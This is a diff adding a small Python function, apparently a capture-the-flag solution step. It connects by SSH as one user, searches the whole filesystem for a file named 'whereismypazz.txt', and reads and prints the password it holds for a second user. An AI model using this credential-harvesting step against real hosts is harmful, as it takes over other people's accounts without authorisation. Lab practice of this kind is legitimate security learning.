@@ -1,0 +1,21 @@
+import paramiko
+
+
+def get_angela_password(HOST, PORT, sophia_password):
+    ssh = paramiko.SSHClient()
+    ssh.load_system_host_keys()
+    ssh.connect(hostname=HOST, username="sophia", password=sophia_password, port=PORT)
+
+    stdin, stdout, stderr = ssh.exec_command("find / -name whereismypazz.txt")
+    stdout = stdout.readlines()
+    password_file = "".join(stdout).split()[0]
+
+    # Read file and get password
+    stdin, stdout, stderr = ssh.exec_command(f"cat {password_file}")
+    stdout = stdout.readlines()
+    angela_password = "".join(stdout).split()[0]
+    print(angela_password)
+    ssh.close() 
+
+    return angela_password
+
